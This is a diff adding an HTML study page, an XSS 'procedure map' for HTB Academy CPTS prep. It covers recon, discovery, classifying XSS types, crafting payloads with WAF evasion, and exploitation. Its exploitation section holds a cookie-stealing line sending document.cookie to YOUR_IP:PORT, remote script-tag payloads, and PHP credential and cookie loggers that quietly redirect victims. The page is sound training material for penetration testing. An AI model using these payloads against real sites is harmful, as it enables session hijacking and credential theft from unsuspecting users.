@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Module — Full Procedure Map</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#0c0f14;--bg2:#141820;--bg3:#1a1f2a;--border:#2a3040;
+--text:#e0ddd5;--text2:#9a978e;--text3:#6a675f;
+--purple:#9b8afb;--purple-bg:#1e1a35;--purple-border:#3d3470;
+--teal:#5dcaa5;--teal-bg:#0d2922;--teal-border:#1a5040;
+--coral:#f0997b;--coral-bg:#2d1a12;--coral-border:#5a3420;
+--blue:#85b7eb;--blue-bg:#0f1e30;--blue-border:#1c3a5a;
+--amber:#f0c050;--amber-bg:#2a2010;--amber-border:#5a4420;
+--red:#f09595;--red-bg:#2d1414;--red-border:#5a2020;
+--mono:'JetBrains Mono',monospace;--sans:'DM Sans',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);padding:40px 20px;max-width:1100px;margin:0 auto}
+h1{font-size:28px;font-weight:700;margin-bottom:6px;letter-spacing:-0.5px}
+.subtitle{color:var(--text2);font-size:14px;margin-bottom:40px}
+.module-tag{display:inline-block;background:var(--purple-bg);color:var(--purple);border:1px solid var(--purple-border);padding:2px 10px;border-radius:20px;font-size:11px;font-weight:500;margin-bottom:16px;letter-spacing:0.5px;text-transform:uppercase}
+
+.phase{margin-bottom:32px;position:relative}
+.phase::before{content:'';position:absolute;left:20px;top:56px;bottom:-32px;width:1px;background:var(--border)}
+.phase:last-child::before{display:none}
+
+.phase-header{display:flex;align-items:center;gap:14px;margin-bottom:16px;cursor:pointer;user-select:none}
+.phase-num{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;flex-shrink:0;position:relative;z-index:1}
+.phase-info{flex:1}
+.phase-title{font-size:18px;font-weight:700;letter-spacing:-0.3px}
+.phase-desc{font-size:12px;margin-top:2px}
+.phase-toggle{font-size:18px;color:var(--text3);transition:transform .2s}
+.phase.open .phase-toggle{transform:rotate(90deg)}
+
+.phase-content{display:none;margin-left:54px;padding-left:20px;border-left:1px solid var(--border)}
+.phase.open .phase-content{display:block}
+
+.step{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:8px;font-size:13px;line-height:1.65;transition:border-color .15s}
+.step:hover{border-color:var(--text3)}
+.step-label{font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:6px}
+code{font-family:var(--mono);font-size:11.5px;background:var(--bg3);padding:2px 7px;border-radius:4px;border:1px solid var(--border);white-space:nowrap}
+.cmd-block{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin:8px 0 4px;font-family:var(--mono);font-size:11.5px;line-height:1.8;overflow-x:auto;white-space:pre-wrap;color:var(--text2)}
+
+.branches{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:8px}
+@media(max-width:700px){.branches{grid-template-columns:1fr}}
+.branch{border-radius:10px;padding:14px 16px;border-width:1px;border-style:solid}
+.branch-title{font-size:14px;font-weight:700;margin-bottom:6px}
+.branch-sub{font-size:12px;line-height:1.6}
+
+.b-purple{background:var(--purple-bg);border-color:var(--purple-border);}.b-purple .branch-title{color:var(--purple)}
+.b-teal{background:var(--teal-bg);border-color:var(--teal-border);}.b-teal .branch-title{color:var(--teal)}
+.b-coral{background:var(--coral-bg);border-color:var(--coral-border);}.b-coral .branch-title{color:var(--coral)}
+.b-blue{background:var(--blue-bg);border-color:var(--blue-border);}.b-blue .branch-title{color:var(--blue)}
+.b-amber{background:var(--amber-bg);border-color:var(--amber-border);}.b-amber .branch-title{color:var(--amber)}
+.b-red{background:var(--red-bg);border-color:var(--red-border);}.b-red .branch-title{color:var(--red)}
+
+.p1 .phase-num{background:var(--purple-bg);color:var(--purple);border:2px solid var(--purple-border)}
+.p1 .phase-title{color:var(--purple)}.p1 .phase-desc{color:var(--text2)}
+.p2 .phase-num{background:var(--teal-bg);color:var(--teal);border:2px solid var(--teal-border)}
+.p2 .phase-title{color:var(--teal)}.p2 .phase-desc{color:var(--text2)}
+.p3 .phase-num{background:var(--coral-bg);color:var(--coral);border:2px solid var(--coral-border)}
+.p3 .phase-title{color:var(--coral)}.p3 .phase-desc{color:var(--text2)}
+.p4 .phase-num{background:var(--blue-bg);color:var(--blue);border:2px solid var(--blue-border)}
+.p4 .phase-title{color:var(--blue)}.p4 .phase-desc{color:var(--text2)}
+.p5 .phase-num{background:var(--amber-bg);color:var(--amber);border:2px solid var(--amber-border)}
+.p5 .phase-title{color:var(--amber)}.p5 .phase-desc{color:var(--text2)}
+
+.legend{display:flex;flex-wrap:wrap;gap:8px;margin-top:40px;padding-top:20px;border-top:1px solid var(--border)}
+.legend-item{font-size:11px;padding:4px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text2)}
+
+.footer{margin-top:32px;text-align:center;color:var(--text3);font-size:11px}
+</style>
+</head>
+<body>
+
+<div class="module-tag">HTB Academy — CPTS</div>
+<h1>Cross-Site Scripting (XSS)</h1>
+<p class="subtitle">Full procedure map — from recon to exploitation</p>
+
+<!-- PHASE 1 -->
+<div class="phase p1 open" onclick="toggle(event,this)">
+  <div class="phase-header">
+    <div class="phase-num">1</div>
+    <div class="phase-info">
+      <div class="phase-title">Recon — identify inputs</div>
+      <div class="phase-desc">Map the attack surface before testing anything</div>
+    </div>
+    <div class="phase-toggle">›</div>
+  </div>
+  <div class="phase-content">
+    <div class="step">
+      <div class="step-label" style="color:var(--purple)">Find all input fields</div>
+      View page source to locate every input: form fields, URL params, HTTP headers (Cookie, User-Agent).
+      <div class="cmd-block">curl -s http://TARGET/ | grep -i "input\|name=\|action="</div>
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--purple)">Submit the form first</div>
+      Get a fully populated URL with all params (e.g. <code>?fullname=test&username=test&email=test@test.com</code>). Tools like XSStrike fail if params are tested individually when the app requires all fields present.
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--purple)">Identify the HTML context</div>
+      View source to see how your input renders. This determines the breakout:<br><br>
+      <code>&lt;img src='INPUT'&gt;</code> → breakout: <code>'&gt;</code><br>
+      <code>&lt;input value="INPUT"&gt;</code> → breakout: <code>"&gt;</code><br>
+      <code>&lt;div&gt;INPUT&lt;/div&gt;</code> → no breakout needed, bare <code>&lt;script&gt;</code> works
+    </div>
+  </div>
+</div>
+
+<!-- PHASE 2 -->
+<div class="phase p2" onclick="toggle(event,this)">
+  <div class="phase-header">
+    <div class="phase-num">2</div>
+    <div class="phase-info">
+      <div class="phase-title">Discovery — find the XSS</div>
+      <div class="phase-desc">Automated + manual testing to confirm vulnerability</div>
+    </div>
+    <div class="phase-toggle">›</div>
+  </div>
+  <div class="phase-content">
+    <div class="branches">
+      <div class="branch b-teal">
+        <div class="branch-title">Automated scanning</div>
+        <div class="branch-sub">
+          <strong>XSStrike:</strong><br>
+          <code>python xsstrike.py -u "URL?param=test"</code><br><br>
+          Also: Nessus, Burp Pro, ZAP<br><br>
+          Look for: "Reflections found", Efficiency: 100, Confidence: 10
+        </div>
+      </div>
+      <div class="branch b-teal">
+        <div class="branch-title">Manual testing</div>
+        <div class="branch-sub">
+          PayloadAllTheThings, Payload-Box<br><br>
+          <strong>Basic:</strong> <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
+          <strong>Event handler:</strong> <code>&lt;img src=x onerror=alert(1)&gt;</code><br>
+          <strong>Encoded:</strong> <code>&lt;HtMl%09onPoIntERENTER+=+confirm()&gt;</code>
+        </div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--teal)">Blind XSS detection</div>
+      When you can't see the output (admin panels, support tickets), use remote script callbacks with field name in URL path:
+      <div class="cmd-block">&lt;script src=http://YOUR_IP:PORT/fieldname&gt;&lt;/script&gt;
+"&gt;&lt;script src=http://YOUR_IP:PORT/fieldname&gt;&lt;/script&gt;
+'&gt;&lt;script src=http://YOUR_IP:PORT/fieldname&gt;&lt;/script&gt;</div>
+      Whichever field name appears in your listener = that's the vulnerable field.
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--teal)">Always verify manually</div>
+      Automated tools give false negatives. XSStrike saying "No reflection" doesn't mean it's safe — the app may need all params present, or the breakout context may be unusual.
+    </div>
+  </div>
+</div>
+
+<!-- PHASE 3 -->
+<div class="phase p3" onclick="toggle(event,this)">
+  <div class="phase-header">
+    <div class="phase-num">3</div>
+    <div class="phase-info">
+      <div class="phase-title">Classify — what type of XSS?</div>
+      <div class="phase-desc">Determines the delivery method and exploit path</div>
+    </div>
+    <div class="phase-toggle">›</div>
+  </div>
+  <div class="phase-content">
+    <div class="branches">
+      <div class="branch b-coral">
+        <div class="branch-title">Reflected</div>
+        <div class="branch-sub">Input reflects in response via URL params. Does not persist. Victim must click a crafted URL.<br><br><strong>Test:</strong> Change param value → see if it appears in response → inject payload via URL.</div>
+      </div>
+      <div class="branch b-coral">
+        <div class="branch-title">Stored</div>
+        <div class="branch-sub">Input persists in DB (comments, profiles, tickets). Fires every time the page loads. Most dangerous — no victim interaction needed after injection.</div>
+      </div>
+    </div>
+    <div class="branches">
+      <div class="branch b-coral">
+        <div class="branch-title">DOM-based</div>
+        <div class="branch-sub">Client-side JS processes input unsafely (source → sink). Never hits the server. Look for: <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>location.hash</code></div>
+      </div>
+      <div class="branch b-coral">
+        <div class="branch-title">Blind</div>
+        <div class="branch-sub">Triggers on a page you can't see (admin panel). Detect via out-of-band callbacks to your server. Higher success rate with DOM XSS sinks.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PHASE 4 -->
+<div class="phase p4" onclick="toggle(event,this)">
+  <div class="phase-header">
+    <div class="phase-num">4</div>
+    <div class="phase-info">
+      <div class="phase-title">Craft payload — match the context</div>
+      <div class="phase-desc">Breakout + vector + evasion + cleanup</div>
+    </div>
+    <div class="phase-toggle">›</div>
+  </div>
+  <div class="phase-content">
+    <div class="step">
+      <div class="step-label" style="color:var(--blue)">1. Breakout</div>
+      Close the current HTML context to inject your own code:<br><br>
+      Single-quoted attr: <code>'&gt;</code> &nbsp;|&nbsp; Double-quoted attr: <code>"&gt;</code> &nbsp;|&nbsp; Unquoted/text: bare tag
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--blue)">2. Injection vector</div>
+      <code>&lt;script&gt;</code> tags — most basic, most filtered<br>
+      Event handlers — <code>onerror</code>, <code>onmouseover</code>, <code>onpointerenter</code>, <code>onfocus</code><br>
+      Remote script — <code>&lt;script src=http://IP/script.js&gt;</code> — most flexible, payload lives on your server
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--blue)">3. WAF/filter evasion</div>
+      Mixed case: <code>OnPoIntERENTER</code><br>
+      URL-encoded whitespace: <code>%09</code> (tab), <code>%0a</code> (newline), <code>%0d</code> (carriage return)<br>
+      Alternate alert functions: <code>confirm()</code>, <code>prompt()</code><br>
+      Alternate tags: <code>&lt;details&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;d3V&gt;</code>
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--blue)">4. Page cleanup</div>
+      Remove original elements: <code>document.getElementById('formId').remove();</code><br>
+      Comment out leftover HTML: <code>&lt;!--</code> at the end of payload
+    </div>
+  </div>
+</div>
+
+<!-- PHASE 5 -->
+<div class="phase p5" onclick="toggle(event,this)">
+  <div class="phase-header">
+    <div class="phase-num">5</div>
+    <div class="phase-info">
+      <div class="phase-title">Exploit — phishing or session hijacking</div>
+      <div class="phase-desc">Two attack paths to steal credentials or cookies</div>
+    </div>
+    <div class="phase-toggle">›</div>
+  </div>
+  <div class="phase-content">
+    <div class="branch b-amber" style="margin-bottom:10px">
+      <div class="branch-title">Path A — Phishing (credential theft)</div>
+      <div class="branch-sub">
+        <strong>Goal:</strong> Inject a fake login form that sends creds to your server<br><br>
+        <strong>1.</strong> Use <code>document.write()</code> to inject a fake form with <code>action=http://YOUR_IP:PORT</code><br>
+        <strong>2.</strong> Clean up the page: <code>document.getElementById('formId').remove()</code> + <code>&lt;!--</code><br>
+        <strong>3.</strong> Host PHP cred catcher:
+        <div class="cmd-block">&lt;?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://TARGET/original-page");
+    fclose($file);
+    exit();
+}
+?&gt;</div>
+        <strong>4.</strong> Deliver malicious URL via app's sharing feature or social engineering<br>
+        <strong>5.</strong> <code>cat creds.txt</code> → login as victim
+      </div>
+    </div>
+    <div class="branch b-amber" style="margin-bottom:10px">
+      <div class="branch-title">Path B — Session hijacking (cookie theft)</div>
+      <div class="branch-sub">
+        <strong>Goal:</strong> Steal victim's session cookie and impersonate them<br><br>
+        <strong>1.</strong> Create <code>script.js</code>:
+        <div class="cmd-block">new Image().src='http://YOUR_IP:PORT/index.php?c='+document.cookie;</div>
+        <strong>2.</strong> Host PHP cookie logger:
+        <div class="cmd-block">&lt;?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?&gt;</div>
+        <strong>3.</strong> Start PHP server: <code>sudo php -S 0.0.0.0:PORT</code><br>
+        <strong>4.</strong> Inject: <code>"&gt;&lt;script src=http://YOUR_IP:PORT/script.js&gt;&lt;/script&gt;</code><br>
+        <strong>5.</strong> <code>cat cookies.txt</code> → set cookie in browser (Shift+F9 → Storage → +) → refresh = logged in as victim
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-label" style="color:var(--amber)">Why PHP over netcat?</div>
+      Netcat catches the request but returns an error to the victim (suspicious). The PHP script logs silently and redirects the victim back to the real page — no suspicion raised.
+    </div>
+  </div>
+</div>
+
+<div class="legend">
+  <div class="legend-item">HTB Academy — Cross-Site Scripting (XSS) Module</div>
+  <div class="legend-item">Sections 1–10 covered</div>
+  <div class="legend-item">CPTS Certification Path</div>
+</div>
+<div class="footer">XSS Procedure Map — Built for CPTS prep</div>
+
+<script>
+function toggle(e,el){
+  if(e.target.tagName==='CODE')return;
+  el.classList.toggle('open');
+}
+document.querySelectorAll('.phase').forEach(p=>p.classList.add('open'));
+</script>
+</body>
+</html>
